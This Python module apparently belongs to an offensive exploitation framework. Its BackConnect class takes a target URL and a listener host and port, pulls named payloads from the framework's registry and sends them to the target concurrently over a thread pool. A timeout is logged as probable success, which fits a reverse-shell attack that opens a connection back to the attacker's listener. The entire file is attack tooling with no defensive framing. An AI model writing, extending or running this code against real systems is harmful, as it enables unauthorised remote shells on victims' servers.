import lib.framework.framework as framework
import lib.framework.utility.logger as logger
from threading import Lock
from multiprocessing.pool import ThreadPool
from lib.framework.core import PayloadRequest
from requests.exceptions import InvalidURL, ConnectionError, ReadTimeout


class BackConnect:
    thread_lock = Lock()

    def __init__(self, url, listen_hort, listen_port):
        self.url = url
        self.listen_host = listen_hort
        self.listen_port = listen_port
        self.payloads = []
        self.postdata = None

    @staticmethod
    def send_payload(payload_request):
        name = payload_request.payload.name

        with BackConnect.thread_lock:
            logger.custom(name, f"Sending payload...")

        try:
            payload_request.make()
            logger.custom(name, "Back connect was not successful.")
        except (ReadTimeout, TimeoutError):
            logger.custom(name, "Timeout, this should be success?")
        except InvalidURL:
            logger.custom(name, "The URL you have provided appears to be invalid.")
        except ConnectionError:
            logger.custom(name, "We failed to connect to the url, is the target online?")
        except Exception as e:
            logger.custom(name, f"An unexpected error occurred: {type(e).__name__}")

    def set_payloads(self, payloads):
        if type(payloads) is str:
            self.payloads.append(framework.payloads.available_payloads[payloads])
        else:
            for payload in payloads:
                self.payloads.append(framework.payloads.available_payloads[payload])

    def set_postdata(self, postdata):
        self.postdata = postdata

    def connect(self):
        payload_requests = []

        for payload in self.payloads:
            request = PayloadRequest(self.url, payload)

            if self.postdata:
                request.set_postdata(self.postdata)

            payload_requests.append(request)

        thread_pool = ThreadPool(10)
        thread_pool.map(self.send_payload, payload_requests)

        thread_pool.close()
        thread_pool.join()
